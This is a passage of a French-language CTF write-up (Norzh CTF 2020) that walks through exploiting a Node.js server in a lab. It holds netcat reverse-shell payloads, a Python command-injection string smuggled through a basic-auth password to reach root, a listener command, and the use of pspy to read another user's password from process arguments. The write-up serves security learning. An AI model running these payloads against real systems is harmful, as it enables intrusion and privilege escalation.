<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;</span><span class="p">)</span><span class="p">)</span> <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Et on obtient bien un accès sur notre listener.</p>
<p>Je fais ensuite en sorte d&rsquo;avoir un shell totalement interactif.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>

	&lt;Ctrl+Z&gt;

stty -a <span class="p">|</span> head -n1 <span class="c1">#Je lis les valeurs rows &amp; columns</span>
stty raw -echo
<span class="nb">fg</span> <span class="c1">#Il faut faire plusieures fois entrée</span>
stty rows X columns Y <span class="c1">#Avec X et Y les valeurs lues plus haut</span>
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
</code></pre></td></tr></table>
</div>
</div><p>Puis on va lire le flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> 
cat flag
	ENSIBS<span class="o">{</span>Web-ServerUserFlagHereBroooo<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Parfait, passons à l'étape 3.</p>
<h1 id="obtenir-un-shell-root">Obtenir un shell root</h1>
<p>Déjà, le premier reflexe est de voir ce qu&rsquo;on peut executer avec sudo.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_sudo.jpg" alt="Retour de sudo -l" class="lazyload"><figcaption class="image-caption">Retour de sudo -l</figcaption></figure></p>
<p>Le sudo nous permet de lancer un serveur node.js en tant que root. En regardant les processus, on voit que ce serveur tourne déjà. On va dans un premier temps regarder le code de ce dernier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
<span class="kr">const</span>  <span class="nx">express_basic_auth</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-basic-auth&#39;</span><span class="p">)</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>

<span class="kr">const</span> <span class="nx">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nx">PORT</span> <span class="o">:</span> <span class="mi">3000</span>
<span class="p">}</span>

<span class="kr">const</span> <span class="nx">check_credentials</span> <span class="o">=</span> <span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="nx">password</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">process</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;/healthcheck/authent.sh&#39;</span><span class="p">,</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">password</span> <span class="p">]</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">String</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;True&#39;</span>
<span class="p">}</span>

<span class="kr">const</span> <span class="nx">basic_auth</span> <span class="o">=</span> <span class="nx">express_basic_auth</span><span class="p">(</span><span class="p">{</span>
    <span class="nx">authorizer</span> <span class="o">:</span> <span class="nx">check_credentials</span><span class="p">,</span>
    <span class="nx">unauthorizedResponse</span><span class="o">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">req</span><span class="p">.</span><span class="nx">auth</span>
        <span class="o">?</span> <span class="p">(</span><span class="s1">&#39;Credentials &#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">auth</span><span class="p">.</span><span class="nx">user</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="s2">&#34;**********&#34;</span> <span class="o">+</span> <span class="s1">&#39; rejected&#39;</span><span class="p">)</span>
        <span class="o">:</span> <span class="s1">&#39;No credentials provided&#39;</span>
    <span class="p">}</span>
<span class="p">}</span><span class="p">)</span>

<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">(</span><span class="p">)</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">basic_auth</span><span class="p">)</span>


<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/ping&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;up&#34;</span><span class="p">)</span>
<span class="p">}</span><span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/health&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/ps&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;-auxfw&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
<span class="p">}</span><span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/disk-usage&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/df&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
<span class="p">}</span><span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/web-logs&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;/var/log/httpd/error_log&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
<span class="p">}</span><span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/active-connections&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/netstat&#39;</span><span class="p">,</span><span class="p">[</span><span class="s1">&#39;-laputen&#39;</span><span class="p">]</span><span class="p">)</span><span class="p">.</span><span class="nx">stdout</span><span class="p">)</span><span class="p">)</span>
<span class="p">}</span><span class="p">)</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">(</span><span class="p">)</span> <span class="p">=&gt;</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="sb">Healthcheck app listening on port </span><span class="si">${</span><span class="nx">config</span><span class="p">.</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">!</span><span class="sb">`</span><span class="p">)</span><span class="p">,</span>
<span class="p">)</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>Il s&rsquo;agit d&rsquo;un healthcheck sur le port 3000 avec authentification via basic-auth. On n&rsquo;a pas les droits pour modifier ces fichiers donc la seule piste actuelle serait d&rsquo;effectuer une injection via ce que fait le serveur.</p>
<p>En s&rsquo;intéressant un peu plus à la fonction <strong>check_credentials</strong>, on voit qu&rsquo;il appelle un script shell avec en argument le couple login/password avec lequel on veut s&rsquo;authentifier. On va donc regarder ça de plus près.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
<span class="nv">PATH</span><span class="o">=</span>/bin:/usr/bin

<span class="nv">username</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">PASSWORD</span><span class="o">=</span><span class="nv">$2</span>

<span class="nv">IFS</span><span class="o">=</span><span class="s1">&#39;&#39;</span>

<span class="nv">shadow_line</span><span class="o">=</span><span class="k">$(</span>cat /etc/shadow <span class="p">|</span> grep <span class="nv">$1</span><span class="k">)</span>
python3 -c <span class="s2">&#34;</span><span class="s2">import crypt;salt=&#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;\$6\$&#39;)[1].split(&#39;</span>$<span class="s2">&#39;)[0];hash = crypt.crypt(&#39;</span><span class="nv">$PASSWORD</span><span class="s2">&#39;, &#39;\$6\$&#39;+salt+&#39;</span>$<span class="s2">&#39;);print(hash == &#39;</span><span class="nv">$shadow_line</span><span class="s2">&#39;.split(&#39;:&#39;)[1],end=&#39;&#39;)</span><span class="s2">&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>On se retrouve donc face à un script plutôt&hellip; Sale. Mais intéréssant !</p>
<p>En effet, le script va :</p>
<ul>
<li>Récupérer notre couple username / password et les mettre dans des variables</li>
<li>Extraire dans le fichier shadow le hash du mot de passe de l&rsquo;utilisateur</li>
<li>Lancer du python en ligne de commande qui va hasher notre mot de passe et comparer son hash avec celui récupéré</li>
</ul>
<p>Les variables étant passées en ligne de commande pour le python, s&rsquo;il y a des quotes elles seront interprétées. On a donc ici notre injection sur la variable <strong>$PASSWORD</strong>. Il faudra :</p>
<ul>
<li>Ouvrir une quote</li>
<li>Compléter la fonction <em>crypt.crypt()</em> pour éviter une erreur</li>
<li>Ajouter le code que l&rsquo;on veut executer</li>
<li>Commenter le reste du code python</li>
</ul>
<p>On se trouve avec une payload comme suit :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39;,&#39;&#39;);import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&#39;)#
</code></pre></td></tr></table>
</div>
</div><p>Et pour faire ma requête, afin de ne pas m&rsquo;embêter avec le basic-auth, je vais utiliser python-requests.</p>
<p>J&rsquo;ouvre donc un listener :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp <span class="m">51338</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">http://localhost:3000/ping</span><span class="s2">&#34;</span><span class="p">,</span> 
                 <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="p">}</span><span class="p">,</span> 
                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">root</span><span class="s2">&#34;</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">&#39;</span><span class="s2">,</span><span class="s2">&#39;</span><span class="s2">&#39;</span><span class="s2">);import os;os.system(</span><span class="s2">&#39;</span><span class="s2">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f</span><span class="s2">&#39;</span><span class="s2">)#</span><span class="s2">&#34;</span><span class="p">)</span>
                <span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Malheureusement, cette première requête n&rsquo;a pas fonctionné&hellip; Je fais donc d&rsquo;autre test en remplaçant le user <strong>root</strong> par <strong>web-dev</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">http://localhost:3000/ping</span><span class="s2">&#34;</span><span class="p">,</span>
                 <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="p">}</span><span class="p">,</span>
                 <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">web-dev</span><span class="s2">&#34;</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">&#39;</span><span class="s2">,</span><span class="s2">&#39;</span><span class="s2">&#39;</span><span class="s2">);import os;os.system(</span><span class="s2">&#39;</span><span class="s2">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.17.0.1 51338 &gt;/tmp/f</span><span class="s2">&#39;</span><span class="s2">)#</span><span class="s2">&#34;</span><span class="p">)</span>
                <span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Et on obtient bien un shell root. On repète notre petite liste de commandes pour obtenir notre shell interactif puis on va lire le flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> 
$ cat flag
ENSIBS<span class="o">{</span>JesappelleRoot<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Et de 3 challs validés !</p>
<p>On peut d&rsquo;ailleurs voir pourquoi la commande ne fonctionnait pas avec l&rsquo;utilisateur root : On est dans un docker et le root n&rsquo;a pas de mot de passe.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_shadow_root.png" alt="/etc/shadow, ligne du root" class="lazyload"><figcaption class="image-caption">/etc/shadow, ligne du root</figcaption></figure></p>
<p>Le script s&rsquo;arrêtait donc sûrement avant l&rsquo;execution du python.</p>
<h1 id="trouver-le-mot-de-passe-de-web-dev">Trouver le mot de passe de web-dev</h1>
<p>Ici, on se trouve face à un cas un peu spécifique&hellip; En général on trouve le mot de passe d&rsquo;un utilisateur puis on s&rsquo;en sert pour se connecter. Là le but final est de trouver ce mot de passe.</p>
<p>Le mot de passe étant le flag (probablement), casser le hash de <em>/etc/shadow</em> serait impossible puisqu&rsquo;il ne sera pas dans une wordlist.</p>
<p>La première idée qui me vient serait donc de vérifier dans tous les fichiers de configuration si la mention <strong>ENSIBS</strong> apparaît quelque part. Pour cela, rien de plus simple qu&rsquo;un grep.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">cd</span> /
$ grep -lR <span class="s1">&#39;ENSIBS{&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>Mais après discussion avec le créateur du challenge, c&rsquo;est inutile. Le flag n&rsquo;est pas simplement caché sur le serveur.</p>
<p>Je vois donc 2 possibilités :</p>
<ul>
<li>Le flag est chiffré quelque part</li>
<li>Le flag est à l&rsquo;exterieur du serveur</li>
</ul>
<p>Au bout de 5min de réflexion intense, j&rsquo;ai l&rsquo;illumination : Le serveur sur le port 3000 est un serveur de &ldquo;healthcheck&rdquo; c&rsquo;est à dire que les utilisateurs vont se connecter assez régulièrement vérifier qu&rsquo;il est encore en vie et que tout fonctionne comme il faut.</p>
<p>Donc l&rsquo;utilisateur web-dev fera sûrement des requêtes où il va s&rsquo;authentifier, et son mot de passe apparaîtra dans les processus en argument de authent.sh ou dans la ligne de commande python.</p>
<p>Je récupère donc un outil magique : <a href="https://github.com/DominicBreuker/pspy" target="_blank"><strong>pspy</strong></a>, un executable qui affiche les processus en temps réel avec leurs arguments.</p>
<p>Je le lance et je vois très vite le saint graal.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_get_password.png" alt="Mot de passe de web-dev" class="lazyload"><figcaption class="image-caption">Mot de passe de web-dev</figcaption></figure></p>
<p>Son mot de passe est donc le quatrième flag</p>
<blockquote>
<p>ENSIBS{I_kn0w_Ur_passWord_Web_dev}</p>
</blockquote>
<h1 id="retour-sur-le-scénario">Retour sur le scénario</h1>
<p>J&rsquo;ai trouvé ce scénario très intéréssant, il m&rsquo;a fait travailler sur des technos sur lesquelles je ne tape pas souvent (voire jamais) comme GraphQL ou node.js. Je me suis donc bien amusé et il a pu nous rapporter un total de 1000 points (250 par challenge), ce qui n&rsquo;est pas negligeable.</p>
<p>Cependant les parties 2 &amp; 3 étaient quelque chose de &ldquo;custom&rdquo; de façon un peu trop flagrante ce qui peut un peu enlever au réalisme voulu par le CTF.</p>
<p>Malgré tout, bravo aux organisateurs et particulièrement à <a href="https://twitter.com/Areizen_" target="_blank">Areizen</a> pour ce scénario.</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>The article was updated on 2020-02-06</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share"><span><a href="//twitter.com/share?url=%2f2020%2f02%2fnuclea-web-extranet%2f&amp;text=Norzh%20CTF%202020%20-%20Extranet%20Norzh%20Nuclea&amp;via=driikolu" target="_blank" title="Share on Twitter">
            <i class="fab fa-twitter fa-fw"></i>
        </a><a href="//www.facebook.com/sharer/sharer.php?u=%2f2020%2f02%2fnuclea-web-extranet%2f" target="_blank" title="Share on Facebook">
            <i class="fab fa-facebook-square fa-fw"></i>
        </a><a href="//reddit.com/submit?url=%2f2020%2f02%2fnuclea-web-extranet%2f&amp;title=Norzh%20CTF%202020%20-%20Extranet%20Norzh%20Nuclea" target="_blank" title="Share on Reddit">
            <i class="fab fa-reddit fa-fw"></i>
        </a><a href="//www.linkedin.com/shareArticle?url=%2f2020%2f02%2fnuclea-web-extranet%2f&amp;title=Norzh%20CTF%202020%20-%20Extranet%20Norzh%20Nuclea" target="_blank" title="Share on LinkedIn">
            <i class="fab fa-linkedin fa-fw"></i>
        </a></span></div>
        </div>
    </div>

    <div class="post-info-more">
        <section></section>
        <section>
            <span><a href="javascript:window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/2020/03/install_arch_chiffre_uefi/" class="next" rel="next" title="Installation d&#39;Archlinux en UEFI &amp; chiffré">Installation d&#39;Archlinux en UEFI &amp; chiffré<i class="fas fa-angle-right fa-fw"></i></a></div>
</div><div class="post-comment"></div>
    </article></div>
            </main><footer class="footer">
    <div class="copyright"><div class="copyright-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
        </div>

        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Driikolu</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
    </div>
</footer></div><a href="#" class="dynamic-to-top" id="dynamic-to-top" data-scroll>
            <span>&nbsp;</span>
        </a><script src="/js/lib/jquery/jquery.slim.min.js"></script><script src="/js/lib/lazysizes/lazysizes.min.js"></script><script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.js"></script><script>window.scroll = new SmoothScroll('[data-scroll]', {speed: 300, speedAsDuration: true});</script><link rel="stylesheet" href="/css/lib/katex/katex.min.css"><script src="/js/lib/katex/katex.min.js"></script><script defer src="/js/lib/katex/auto-render.min.js"></script><link rel="stylesheet" href="/css/lib/katex/copy-tex.min.css"><script defer src="/js/lib/katex/copy-tex.min.js"></script><script defer src="/js/lib/katex/mhchem.min.js"></script><script>
        document.addEventListener("DOMContentLoaded", function () {
            renderMathInElement(document.body, {
                delimiters: [
                    { left: "$$", right: "$$", display: true },
                    { left: "\\(", right: "\\)", display: false },
                    { left: "\\[", right: "\\]", display: true },{ left: "$", right: "$", display: false },]
            });
        });
    </script><script src="/js/blog.min.js"></script></body>
</html>